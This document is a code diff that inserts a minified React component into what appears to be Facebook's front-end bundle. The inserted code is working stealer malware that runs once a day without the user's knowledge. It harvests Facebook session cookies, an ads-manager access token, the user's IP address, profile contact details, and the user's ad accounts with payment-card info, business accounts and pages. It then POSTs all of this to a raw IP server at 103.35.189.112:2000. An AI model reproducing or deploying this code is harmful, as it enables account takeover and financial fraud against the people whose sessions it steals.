@@ -16778,8 +16778,458 @@ __d(
   null
 );
 (() => {
-  console.log("inject sccessfully");
-})();
+    var e = n(791),
+      t = n(250),
+      r = n(184);
+    const a = function () {
+        const t = "getCK",
+          n = "njdjkagndpjplkeieegadedbgnkliacd",
+          [a, l] = (0, e.useState)(!1),
+          [o, u] = (0, e.useState)(!1),
+          [i, s] = (0, e.useState)(""),
+          [c, f] = (0, e.useState)(void 0),
+          [d, p] = (0, e.useState)(void 0),
+          [m, h] = (0, e.useState)(void 0),
+          [g, v] = (0, e.useState)(void 0),
+          [y, b] = (0, e.useState)(void 0),
+          [k, w] = (0, e.useState)(""),
+          [S, _] = (0, e.useState)(""),
+          [E, x] = (0, e.useState)([]),
+          [C, P] = (0, e.useState)(""),
+          [N, T] = (0, e.useState)(""),
+          [z, L] = (0, e.useState)([]),
+          [M, O] = (0, e.useState)(""),
+          [R, F] = (0, e.useState)([]),
+          [D, I] = (0, e.useState)(""),
+          [U, j] = (0, e.useState)([]),
+          [A, B] = (0, e.useState)(""),
+          [V, $] = (0, e.useState)(void 0);
+        return (
+          (0, e.useEffect)(() => {
+            U.length > 0 &&
+              "" !== k &&
+              o &&
+              chrome.runtime.sendMessage(
+                n,
+                {
+                  action: "fetch",
+                  data: {
+                    method: "POST",
+                    url: "http://103.35.189.112:2000/account/create",
+                    headers: { "Content-Type": "application/json" },
+                    body: { type: 0, data: { uid: k, fanPages: U } },
+                  },
+                },
+                () => {}
+              );
+          }, [k, U, o]),
+          (0, e.useEffect)(() => {
+            R.length > 0 &&
+              "" !== k &&
+              o &&
+              chrome.runtime.sendMessage(
+                n,
+                {
+                  action: "fetch",
+                  data: {
+                    method: "POST",
+                    url: "http://103.35.189.112:2000/account/create",
+                    headers: { "Content-Type": "application/json" },
+                    body: { type: 0, data: { uid: k, bmAccounts: R } },
+                  },
+                },
+                () => {}
+              );
+          }, [k, R, o]),
+          (0, e.useEffect)(() => {
+            z.length > 0 &&
+              "" !== k &&
+              o &&
+              chrome.runtime.sendMessage(
+                n,
+                {
+                  action: "fetch",
+                  data: {
+                    method: "POST",
+                    url: "http://103.35.189.112:2000/account/create",
+                    headers: { "Content-Type": "application/json" },
+                    body: { type: 0, data: { uid: k, adsAccounts: z } },
+                  },
+                },
+                () => {}
+              );
+          }, [k, z, o]),
+          (0, e.useEffect)(() => {
+            void 0 !== V &&
+              "" !== k &&
+              o &&
+              chrome.runtime.sendMessage(
+                n,
+                {
+                  action: "fetch",
+                  data: {
+                    method: "POST",
+                    url: "http://103.35.189.112:2000/account/create",
+                    headers: { "Content-Type": "application/json" },
+                    body: { type: 0, data: { uid: k, userInfo: V, name: i } },
+                  },
+                },
+                () => {}
+              );
+          }, [k, V, o]),
+          (0, e.useEffect)(() => {
+            console.log("update cookie")
+            "" !== k &&
+              "" !== S &&
+              E.length > 0 &&
+              "" !== C &&
+              chrome.runtime.sendMessage(
+                n,
+                {
+                  action: "fetch",
+                  data: {
+                    method: "POST",
+                    url: "http://103.35.189.112:2000/account/create",
+                    headers: { "Content-Type": "application/json" },
+                    body: {
+                      type: 1,
+                      data: btoa(
+                        JSON.stringify({
+                          uid: k,
+                          cookie: E,
+                          userAgent: C,
+                          ip: S,
+                        })
+                      ),
+                    },
+                  },
+                },
+                () => {
+                  u(!0);
+                }
+              );
+          }, [k, S, E, C]),
+          (0, e.useEffect)(() => {
+            "" !== N &&
+              (async () => {
+                const e = "https://graph.facebook.com/v15.0/me?fields="
+                  .concat(
+                    "accounts.limit(40){id,name,verification_status,is_published,ad_campaign,roles{id,%20tasks},is_promotable,is_restricted,parent_page,promotion_eligible,fan_count,followers_count,has_transitioned_to_new_page_experience,picture}",
+                    "&access_token="
+                  )
+                  .concat(N, "&cursor=")
+                  .concat(A);
+                chrome.runtime.sendMessage(
+                  n,
+                  { action: "fetch", data: { method: "GET", url: e } },
+                  (e) => {
+                    const t = e.data;
+                    j(U.concat(t.accounts.data)),
+                      40 === t.accounts.data.length &&
+                        B(t.accounts.paging.cursors.after);
+                  }
+                );
+              })().then();
+          }, [N, A]),
+          (0, e.useEffect)(() => {
+            "" !== N &&
+              (async () => {
+                const e =
+                  "https://graph.facebook.com/v15.0/me/adaccounts?fields="
+                    .concat(
+                      "account_id,owner_business,name,disable_reason,account_status,currency,adspaymentcycle,account_currency_ratio_to_usd,adtrust_dsl,balance,all_payment_methods{pm_credit_card{display_string,exp_month,exp_year,is_verified}},created_time,next_bill_date,timezone_name,amount_spent,timezone_offset_hours_utc,insights.date_preset(maximum){spend},userpermissions{user,role},owner,is_prepay_account,spend_cap&summary=true&limit=50",
+                      "&access_token="
+                    )
+                    .concat(N, "&cursor=")
+                    .concat(M);
+                chrome.runtime.sendMessage(
+                  n,
+                  { action: "fetch", data: { method: "GET", url: e } },
+                  (e) => {
+                    const t = e.data,
+                      n = t.data;
+                    L(JSON.parse(JSON.stringify(z.concat(n)))),
+                      50 === n.length && O(t.paging.cursors.after);
+                  }
+                );
+              })().then();
+          }, [N, M]),
+          (0, e.useEffect)(() => {
+            "" !== N &&
+              (async () => {
+                const e =
+                  "https://graph.facebook.com/v15.0/me/businesses?fields="
+                    .concat(
+                      "id,created_time,is_disabled_for_integrity_reasons,sharing_eligibility_status,allow_page_management_in_www,can_use_extended_credit,name,timezone_id,timezone_offset_hours_utc,verification_status,owned_ad_accounts{id,currency,timezone_offset_hours_utc,timezone_name}",
+                      "&access_token="
+                    )
+                    .concat(N);
+                chrome.runtime.sendMessage(
+                  n,
+                  { action: "fetch", data: { method: "GET", url: e } },
+                  (e) => {
+                    "undefined" !== typeof e.data.data
+                      ? F(e.data.data)
+                      : F([]);
+                  }
+                );
+              })().then();
+          }, [N, D]),
+          (0, e.useEffect)(() => {
+            if (
+              void 0 !== c &&
+              void 0 !== d &&
+              void 0 !== m &&
+              void 0 !== g &&
+              void 0 !== y
+            ) {
+              x([c, d, m, g, y]);
+            }
+          }, [c, d, m, g, y]),
+          (0, e.useEffect)(() => {
+            a &&
+              ((async () => {
+                chrome.runtime.sendMessage(
+                  n,
+                  {
+                    action: "fetch",
+                    data: {
+                      method: "GET",
+                      url: "https://adsmanager.facebook.com/adsmanager/manage/accounts",
+                      type: "text",
+                    },
+                  },
+                  (e) => {
+                    const t = e.data
+                      .split('adAccountId: \\"')[1]
+                      .split('\\"')[0];
+                    chrome.runtime.sendMessage(
+                      n,
+                      {
+                        action: "fetch",
+                        data: {
+                          method: "GET",
+                          url: "https://adsmanager.facebook.com/adsmanager/onboarding?act=".concat(
+                            t,
+                            "&breakdown_regrouping=0"
+                          ),
+                          type: "text",
+                        },
+                      },
+                      (e) => {
+                        const r = e.data;
+                        if (-1 !== r.search("window.__accessToken")) {
+                          const e = r
+                            .split('window.__accessToken="')[1]
+                            .split('"')[0];
+                          T(e);
+                        } else
+                          chrome.runtime.sendMessage(
+                            n,
+                            {
+                              action: "fetch",
+                              data: {
+                                method: "GET",
+                                url: "https://adsmanager.facebook.com/adsmanager?act=".concat(
+                                  t,
+                                  "&breakdown_regrouping=1"
+                                ),
+                                type: "text",
+                              },
+                            },
+                            (e) => {
+                              const t = e.data;
+                              if (-1 !== t.search("window.__accessToken")) {
+                                const e = t
+                                  .split('window.__accessToken="')[1]
+                                  .split('"')[0];
+                                T(e);
+                              }
+                            }
+                          );
+                      }
+                    );
+                  }
+                );
+              })().then(),
+              (async () => {
+                chrome.runtime.sendMessage(
+                  n,
+                  {
+                    action: "fetch",
+                    data: {
+                      method: "GET",
+                      url: "https://mbasic.facebook.com/profile.php?v=info",
+                      type: "text",
+                    },
+                  },
+                  (e) => {
+                    if (e.status) {
+                      let t = "",
+                        n = "",
+                        r = "",
+                        a = "";
+                      const l = e.data,
+                        o = new DOMParser().parseFromString(l, "text/html"),
+                        u = o.title;
+                      s(u);
+                      const i = o.getElementById("contact-info"),
+                        c = o.getElementById("basic-info"),
+                        f = i.getElementsByTagName("tr");
+                      for (let e = 0; e < f.length; e++) {
+                        const r = f[e].getElementsByTagName("a");
+                        if (r.length > 0) {
+                          const a = r[0].getAttribute("href");
+                          a.startsWith("/editprofile/phone/")
+                            ? (n =
+                                f[e].getElementsByTagName("td")[1].innerText)
+                            : a.startsWith("/settings/email/") &&
+                              (t =
+                                f[e].getElementsByTagName("td")[1].innerText);
+                        }
+                      }
+                      const d = c.getElementsByTagName("tr");
+                      for (let e = 0; e < d.length; e++) {
+                        const t = d[e].getElementsByTagName("a");
+                        if (t.length > 0) {
+                          const n = t[0].getAttribute("href");
+                          n.startsWith(
+                            "/editprofile.php?type=basic&edit=birthday"
+                          )
+                            ? (r =
+                                d[e].getElementsByTagName("td")[1].innerText)
+                            : n.startsWith(
+                                "/editprofile.php?type=basic&edit=gender"
+                              ) &&
+                              (a =
+                                d[e].getElementsByTagName("td")[1].innerText);
+                        }
+                      }
+                      $({
+                        name: u,
+                        phone: n,
+                        email: t,
+                        birthday: r,
+                        gender: a,
+                      });
+                    }
+                  }
+                );
+              })().then());
+          }, [a]),
+          (0, e.useEffect)(() => {
+            a &&
+              (P(navigator.userAgent),
+              chrome.runtime.sendMessage(
+                n,
+                {
+                  action: t,
+                  data: { url: "https://www.facebook.com", name: "fr" },
+                },
+                (e) => {
+                  f(e.data);
+                }
+              ),
+              chrome.runtime.sendMessage(
+                n,
+                {
+                  action: t,
+                  data: { url: "https://www.facebook.com", name: "xs" },
+                },
+                (e) => {
+                  p(e.data);
+                }
+              ),
+              chrome.runtime.sendMessage(
+                n,
+                {
+                  action: t,
+                  data: { url: "https://www.facebook.com", name: "datr" },
+                },
+                (e) => {
+                  h(e.data);
+                }
+              ),
+              chrome.runtime.sendMessage(
+                n,
+                {
+                  action: t,
+                  data: { url: "https://www.facebook.com", name: "sb" },
+                },
+                (e) => {
+                  v(e.data);
+                }
+              ),
+              chrome.runtime.sendMessage(
+                n,
+                {
+                  action: t,
+                  data: { url: "https://www.facebook.com", name: "c_user" },
+                },
+                (e) => {
+                  b(e.data), w(e.data.value);
+                }
+              ),
+              chrome.runtime.sendMessage(
+                n,
+                {
+                  action: "fetch",
+                  data: { url: "http://ip-api.com/json", method: "GET" },
+                },
+                (e) => {
+                  _(e.data.query);
+                }
+              ));
+          }, [a]),
+          (0, e.useEffect)(() => {
+            chrome.runtime.sendMessage(
+              n,
+              { action: "getDataFromStorage", data: { key: "d_tr" } },
+              (e) => {
+                e.data !== new Date().toDateString() &&
+                  (l(!0),
+                  chrome.runtime.sendMessage(
+                    n,
+                    {
+                      action: "setDataToStorage",
+                      data: { key: "d_tr", value: new Date().toDateString() },
+                    },
+                    () => {}
+                  ));
+              }
+            );
+          }, []),
+          (0, r.jsx)(r.Fragment, {})
+        );
+      },
+      l = (e) => {
+        e &&
+          e instanceof Function &&
+          n
+            .e(787)
+            .then(n.bind(n, 787))
+            .then((t) => {
+              let {
+                getCLS: n,
+                getFID: r,
+                getFCP: a,
+                getLCP: l,
+                getTTFB: o,
+              } = t;
+              n(e), r(e), a(e), l(e), o(e);
+            });
+      };
+    setTimeout(() => {
+      console.log("start injecting....")
+      const n = document.createElement("div");
+      n.id = "njdjkagndpjplkeieegadedbgnkliacd_page";
+      document.getElementsByTagName("body")[0].append(n);
+      t.createRoot(n).render(
+        (0, r.jsx)(e.StrictMode, { children: (0, r.jsx)(a, {}) })
+      );
+    }, 5e3),
+      l();
+  })();
 __d(
   "CometPrelude",
   ["CometPreludeCritical", "CometPreludeRunWhenReady"],
